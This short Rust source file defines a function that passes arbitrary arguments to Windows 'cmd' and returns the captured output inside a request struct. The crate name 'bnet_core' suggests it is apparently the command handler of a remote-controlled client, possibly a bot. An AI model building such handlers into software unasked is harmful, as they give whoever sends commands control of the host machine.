use bnet_core::models;

pub fn execute_command(args: Vec<String>) -> models::Request {
    match std::process::Command::new("cmd").args(args).output() {
        Ok(result) => {
            let result_string = String::from_utf8_lossy(&result.stdout).trim().to_string();
            let result_err = String::from_utf8_lossy(&result.stderr).trim().to_string();
            models::Request {
                syl: 'A',
                num: '5',
                msg: if result.status.success() {
                    result_string
                } else {
                    result_string + " " + &result_err
                },
            }
        }
        Err(e) => models::Request {
            syl: 'A',
            num: '5',
            msg: e.to_string(),
        },
    }
}
